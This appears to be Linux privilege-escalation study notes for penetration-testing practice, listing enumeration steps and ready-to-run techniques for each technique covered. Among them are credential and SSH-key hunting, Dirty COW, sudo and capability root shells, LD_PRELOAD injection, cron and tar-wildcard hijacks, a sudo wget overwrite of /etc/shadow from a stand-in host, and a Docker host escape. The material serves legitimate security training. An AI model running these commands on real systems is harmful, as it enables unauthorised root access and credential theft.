1. System Enumeration

System enumeration is the first step in understanding the environment you are working in. Gathering detailed system information helps identify potential vulnerabilities or misconfigurations that can be exploited.

    Basic System Info:
        uname -a: Displays system information, including the kernel version, which can be crucial for finding kernel exploits.

        bash

uname -a

cat /proc/version: Shows the exact version of the kernel, which can be used to check for known vulnerabilities.

bash

cat /proc/version

cat /etc/issue: Displays the operating system version and distribution, helpful for identifying the specific platform you're targeting.

bash

    cat /etc/issue

Hardware and Processor Info:

    lscpu: Lists the CPU architecture, which is important when compiling exploits that are architecture-specific.

    bash

lscpu

lsusb: Shows connected USB devices, useful in scenarios where physical devices might offer an attack vector.

bash

    lsusb

Process and Service Enumeration:

    ps aux: Lists all running processes, which can help identify services running with elevated privileges.

    bash

ps aux

hostname: Displays the system's hostname, useful for identifying the target in a network.

bash

        hostname

Methodology and Tactics:
By thoroughly enumerating the system, you lay the groundwork for identifying possible attack vectors. Understanding the system's architecture and kernel version is critical for choosing the right exploits.
2. User Enumeration

Understanding user accounts and their associated privileges is essential for privilege escalation. Knowing which users have sudo access or which accounts are vulnerable can provide a pathway to root.

    Basic User Info:
        whoami: Displays the current user, useful to verify your current privilege level.

        bash

whoami

id: Shows the user’s UID, GID, and groups, which is critical for identifying administrative accounts.

bash

    id

Sudo Permissions:

    sudo -l: Lists the commands that the current user can run with sudo. This is vital for identifying commands that can be abused for privilege escalation.

    bash

    sudo -l

Password and Group Info:

    cat /etc/passwd: Lists all system users. Combined with /etc/shadow, this can be used to crack passwords.

    bash

cat /etc/passwd

cat /etc/group: Shows all groups and their members, helping identify potentially privileged groups.

bash

        cat /etc/group

Methodology and Tactics:
User enumeration focuses on understanding the roles and privileges of each account. Identifying weak accounts or misconfigured sudo permissions can provide an easy path to privilege escalation.
3. Network Enumeration

Network configuration often holds the key to finding additional attack vectors or understanding the broader network environment.

    Basic Network Info:
        ifconfig (deprecated) or ip a: Displays network interfaces and their configurations.

        bash

ip a

route (deprecated) or ip route: Shows the routing table, which can reveal connected networks and potential pivot points.

bash

    ip route

ARP and Active Connections:

    arp -a or ip neigh: Displays the ARP table, useful for identifying devices on the local network.

    bash

ip neigh

netstat -ano: Shows active connections and listening ports, which can reveal open services or tunnels.

bash

        netstat -ano

Methodology and Tactics:
Network enumeration provides insight into the target's connectivity and possible entry points for further exploitation. Understanding how the network is configured can lead to discovering vulnerable services.
4. Password Hunting

Finding passwords on a system can often lead directly to privilege escalation. System administrators sometimes leave passwords in easily accessible locations.

    Grepping for Passwords:
        grep --color=auto -rnw ‘/‘ -ie “PASSWORD” --color=always 2> /dev/null: Recursively searches the entire filesystem for files containing the word “PASSWORD”.

        bash

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

locate password: Uses the locate database to find files named "password". This can sometimes reveal plaintext password files.

bash

    locate password

SSH Keys and Authorization Files:

    find / -name authorized_keys 2> /dev/null: Searches for SSH authorized keys, which might allow unauthorized access.

    bash

find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null: Looks for private SSH keys that could be used to access other systems.

bash

        find / -name id_rsa 2> /dev/null

Methodology and Tactics:
Password hunting is about leveraging human error. Administrators often leave passwords in plaintext in configuration files or logs. Finding these can lead to immediate access to privileged accounts.
5. Tools

Automated tools can streamline the process of identifying vulnerabilities and misconfigurations that might not be immediately apparent.

    LinPEAS:
        ./linpeas.sh: A script that searches for potential privilege escalation paths on Linux systems.

        bash

    ./linpeas.sh

    Explanation: LinPEAS automates the enumeration process by gathering a comprehensive list of system information and highlighting potential security issues.

LinEnum:

    ./LinEnum.sh: Another comprehensive enumeration script that focuses on finding misconfigurations and vulnerabilities that could be exploited.

    bash

    ./LinEnum.sh

    Explanation: LinEnum provides a detailed report of the system's security posture, making it easier to identify weaknesses.

Linux Exploit Suggester:

    ./linux-exploit-suggester.sh: Suggests possible exploits based on the kernel version and other system details.

    bash

        ./linux-exploit-suggester.sh

        Explanation: This tool compares the system's details against a database of known vulnerabilities, offering potential exploits for privilege escalation.

Methodology and Tactics:
Using automated tools like LinPEAS and LinEnum allows for a quick and thorough examination of the target system, highlighting areas that might be overlooked during manual enumeration.
6. Kernel Exploits

Exploiting vulnerabilities in the kernel is one of the most powerful methods for privilege escalation.

    Compiling and Running Kernel Exploits:
        gcc -pthread c0w.c -o c0w: Compiles the Dirty COW exploit, which can escalate privileges on vulnerable kernels.

        bash

    gcc -pthread c0w.c -o c0w
    ./c0w

    Explanation: Dirty COW (CVE-2016-5195) is a well-known kernel vulnerability that allows attackers to write to read-only memory, effectively escalating privileges.

Running the Exploit:

    ./c0w: Executes the compiled exploit to gain root access.

    bash

        ./c0w

        Explanation: Upon successful execution, this exploit modifies system files, such as /usr/bin/passwd, to escalate privileges.

Methodology and Tactics:
Kernel exploits are highly effective but also risky, as they can crash the system if not executed properly. They should be used with caution, ensuring that the target kernel is vulnerable before proceeding.
7. Stored Passwords

Stored credentials in history files or hidden files can provide a direct route to privilege escalation.

    History Files:
        cat .bash_history: Reviews the command history, which might contain sensitive information like passwords or administrative commands.

        bash

    cat .bash_history

    Explanation: Users often accidentally leave passwords or sensitive commands in their shell history, which can be exploited.

Searching for Passwords in Files:

    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null: Searches the filesystem for instances of the word "PASSWORD".

    bash

        grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

        Explanation: This command searches through all files, identifying any that contain potential passwords or other sensitive information.

Methodology and Tactics:
Stored passwords are often overlooked by administrators. By searching through history files and hidden directories, attackers can find credentials that grant higher privileges.
8. Weak File Permissions

Misconfigured file permissions can allow attackers to modify or read sensitive files, leading to privilege escalation.

    Checking Permissions:
        ls -al /etc/passwd: Checks if the /etc/passwd file has writable permissions, which could allow attackers to add new users.

        bash

    ls -al /etc/passwd

    Explanation: If /etc/passwd is writable by non-root users, attackers can add a new root user with a known password.

Cracking Passwords:

    unshadow passwd shadow > unshadowed.txt: Combines the passwd and shadow files to create a file suitable for password cracking.

    bash

        unshadow passwd shadow > unshadowed.txt

        Explanation: This combined file can then be used with tools like Hashcat to crack passwords.

Methodology and Tactics:
Weak file permissions are a common vulnerability. Ensuring that sensitive files like /etc/passwd and /etc/shadow are not writable by non-root users is critical to maintaining system security.
9. Sudo - Shell Escape

Certain binaries, when executed with sudo, can be exploited to spawn a shell with elevated privileges.

    Listing Sudo Permissions:
        sudo -l: Lists the binaries the current user can run with sudo. Look for binaries that can be exploited.

        bash

    sudo -l

Exploiting Sudo with Vim:

    sudo vim -c ':!/bin/sh': Opens a shell with root privileges using Vim.

    bash

        sudo vim -c ':!/bin/sh'

        Explanation: Vim can be used to spawn a shell if it is allowed to run with sudo. This is because it retains elevated privileges when executing shell commands.

Methodology and Tactics:
Shell escapes exploit the fact that certain applications do not drop their elevated privileges when running shell commands. Identifying such binaries and using them correctly can provide an easy path to root access.
10. Sudo - Intended Functionality

Sometimes, the intended functionality of a sudo command can be leveraged to escalate privileges.

    Using Wget:
        sudo wget https://example.com/file -O /etc/shadow: Downloads a file from the internet and writes it to /etc/shadow, effectively replacing it.

        bash

        sudo wget https://example.com/file -O /etc/shadow

        Explanation: If a user has sudo access to wget, they can overwrite critical system files, leading to privilege escalation.

Methodology and Tactics:
Understanding the intended functionality of sudo commands is crucial. By leveraging these commands creatively, attackers can manipulate the system to gain higher privileges.
11. Sudo - LD_PRELOAD

The LD_PRELOAD environment variable can be used to inject a shared library into a program's memory space when executed with sudo, allowing for privilege escalation.

    Creating a Shared Library:
        gcc -fPIC -shared -o shell.so shell.c -nostartfiles: Compiles the shared object (.so) file that will be injected.

        bash

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

    Explanation: The shared library contains code that will be executed when the target binary runs, potentially spawning a root shell.

Injecting the Library:

    sudo LD_PRELOAD=/tmp/shell.so <cmd>: Executes the target command with the shared library injected.

    bash

        sudo LD_PRELOAD=/tmp/shell.so /usr/bin/somecmd

        Explanation: By injecting custom code into the process, attackers can gain root access or execute arbitrary commands with elevated privileges.

Methodology and Tactics:
LD_PRELOAD is a powerful feature that can be exploited if misconfigured. It's crucial to ensure that only trusted users can modify environment variables when running commands with elevated privileges.
12. SUID Binaries

SUID (Set User ID) binaries are programs that run with the privileges of the file's owner, typically root. Exploiting these can allow for privilege escalation.

    Finding SUID Binaries:
        find / -perm -u=s -type f 2>/dev/null: Searches the system for files with the SUID bit set.

        bash

    find / -perm -u=s -type f 2>/dev/null

    Explanation: The SUID bit allows a program to run with the file owner's privileges, making it a prime target for exploitation.

Exploiting SUID Binaries:

    /path/to/suid_binary: Some SUID binaries can be exploited directly by executing them, leading to a shell with elevated privileges.

    bash

        /path/to/suid_binary

        Explanation: If a SUID binary is poorly written or has known vulnerabilities, executing it can grant a root shell.

Methodology and Tactics:
Exploiting SUID binaries requires identifying which binaries are setuid and then determining if they have known vulnerabilities or can be abused to escalate privileges.
13. Escalation via Environment Variables

Manipulating environment variables can sometimes allow for privilege escalation, especially if the target application is not securely coded.

    Replacing Commands via PATH:
        echo '/bin/bash' > /tmp/service: Creates a malicious service script.

        bash

    echo '/bin/bash' > /tmp/service
    chmod +x /tmp/service

    Explanation: By placing a malicious script in the PATH, attackers can hijack legitimate commands when the environment variable is not properly secured.

Exploiting SUID Environment Binaries:

    sudo env /usr/sbin/service: Executes the hijacked service script with elevated privileges.

    bash

        sudo env /usr/sbin/service

        Explanation: Environment variable manipulation is effective when applications rely on insecure paths or environment configurations.

Methodology and Tactics:
Environment variables can be a subtle yet powerful vector for privilege escalation, particularly in systems where proper sanitization of inputs and paths is not enforced.
14. Capabilities

Linux capabilities provide fine-grained control over the permissions that processes can have. Misconfigured capabilities can allow for privilege escalation.

    Listing Capabilities:
        getcap -r / 2>/dev/null: Recursively lists all capabilities set on the system.

        bash

    getcap -r / 2>/dev/null

    Explanation: Capabilities can grant specific privileges, such as binding to low-numbered ports or accessing raw sockets, to non-root users. Identifying these can reveal paths to privilege escalation.

Exploiting Capabilities:

    /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")': Exploits a capability to escalate to a root shell.

    bash

        /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

        Explanation: If a binary has the cap_setuid capability, it can be exploited to change its effective user ID to root, resulting in a root shell.

Methodology and Tactics:
Capabilities allow processes to perform specific privileged operations without needing full root access. Misconfigured capabilities can be exploited to gain root privileges without needing to exploit a traditional SUID binary.
15. Scheduled Tasks (Cron Jobs)

Cron jobs are scheduled tasks that run at specified intervals. Misconfigured cron jobs can be exploited to gain elevated privileges.

    Identifying Cron Jobs:
        cat /etc/crontab: Displays system-wide cron jobs.

        bash

    cat /etc/crontab

    Explanation: System-wide cron jobs often run as root, and any scripts or commands executed by these jobs can be modified by an attacker to escalate privileges.

Exploiting Writable Cron Scripts:

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/writable/script: Modifies a cron script to create a root shell.

    bash

        echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/writable/script

        Explanation: If a cron job is configured to run a script or command that is writable by non-root users, attackers can modify it to execute malicious code.

Methodology and Tactics:
Cron jobs are a common source of privilege escalation vulnerabilities, especially if they are configured to run scripts or commands with elevated privileges that are writable by non-root users.
16. Cron Wildcards

Cron jobs that use wildcards can be exploited if the wildcard expansion is not properly handled, leading to arbitrary command execution.

    Understanding Cron Wildcards:
        cat /etc/crontab: Check for wildcard usage in cron jobs, such as tar commands that might be susceptible to wildcard injection.

        bash

    cat /etc/crontab

    Explanation: Wildcards in cron jobs can be exploited to execute arbitrary commands if the cron job expands the wildcard in a dangerous way, such as in a tar command.

Exploiting Wildcards:

    touch /home/user/--checkpoint=1 and touch /home/user/--checkpoint-action=exec=sh\ runme.sh: Injects commands using tar's checkpoint feature.

    bash

        touch /home/user/--checkpoint=1
        touch /home/user/--checkpoint-action=exec=sh\ runme.sh

        Explanation: When the cron job runs and executes the tar command, it will also execute the injected commands, leading to privilege escalation.

Methodology and Tactics:
Cron wildcard exploits are a more advanced form of privilege escalation, exploiting the way shell commands handle wildcard expansions. This can be particularly effective in environments where cron jobs are configured with insufficient input sanitization.
17. File Overwrite

Certain files, if overwritten, can allow an attacker to execute arbitrary commands with elevated privileges.

    Overwriting Critical Files:
        echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh: Overwrites a script that is executed with root privileges.

        bash

        echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh

        Explanation: If a file that is executed by a privileged user is writable, it can be overwritten with malicious code that escalates privileges.

Methodology and Tactics:
File overwrite exploits rely on the attacker having write access to scripts or binaries that are executed by root or another privileged user. By carefully selecting which files to overwrite, attackers can escalate their privileges.
18. NFS (Network File System)

NFS allows for file sharing over a network. Misconfigurations in NFS exports can allow attackers to gain elevated privileges.

    Checking for NFS Exports:
        cat /etc/exports: Checks for NFS shares, looking specifically for the no_root_squash option, which allows root privileges on the NFS client.

        bash

    cat /etc/exports

    Explanation: The no_root_squash option means that files created by the root user on the client are also owned by root on the server, which can be exploited for privilege escalation.

Mounting and Exploiting NFS Shares:

    mkdir /tmp/mountme && mount -o rw,vers=2 <target IP>:/exported/dir /tmp/mountme: Mounts the NFS share with read/write permissions.

    bash

        mkdir /tmp/mountme && mount -o rw,vers=2 <target IP>:/exported/dir /tmp/mountme

        Explanation: Once mounted, attackers can exploit the NFS share to modify files or execute scripts with elevated privileges.

Methodology and Tactics:
NFS exploits take advantage of weak configurations that allow non-root users to gain root privileges on the server by manipulating files on the client.
19. Docker

Docker containers, if misconfigured, can allow for privilege escalation to the host system.

    Enumerating Docker Capabilities:
        docker images and docker ps -a: Lists available Docker images and running containers, which can help identify misconfigured containers.

        bash

    docker images
    docker ps -a

    Explanation: Misconfigured Docker containers might allow for escaping the container and gaining access to the host system.

Escaping the Docker Container:

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh: Attempts to escape the container by mounting the root filesystem of the host and chrooting into it.

    bash

        docker run -v /:/mnt --rm -it alpine chroot /mnt sh

        Explanation: If successful, this command allows the attacker to break out of the Docker container and gain access to the host system as root.

Methodology and Tactics:
Docker exploits focus on escaping the container to access the underlying host system. Misconfigurations, such as granting excessive privileges to the container, can make this possible.
20. Capstone Challenges

Capstone challenges provide a way to practice and refine your privilege escalation techniques in a controlled environment.

    TryHackMe and Hack The Box: Platforms like TryHackMe and Hack The Box offer virtual environments where you can practice Linux privilege escalation techniques. These platforms often include scenarios that require exploiting vulnerabilities similar to those outlined in these notes.

Methodology and Tactics:
Capstone challenges are an excellent way to test your understanding of Linux privilege escalation in real-world scenarios. They typically combine multiple techniques and require a deep understanding of the underlying principles.
Additional Resources:

    Linux Privilege Escalation using Capabilities: Learn more about how capabilities work in Linux and how they can be exploited for privilege escalation.
        Link to article

    SUID vs. Capabilities: Understand the differences between SUID and capabilities and how they impact system security.
        Link to article

    Linux Capabilities Privilege Escalation: A deep dive into how to exploit Linux capabilities for privilege escalation, even with SELinux enabled.
        Link to article

This enhanced version provides a more detailed explanation of each technique and includes practical examples and methodologies. This structure should help you not only understand the techniques but also how to apply them effectively in various scenarios.


***** Never Not Learning *****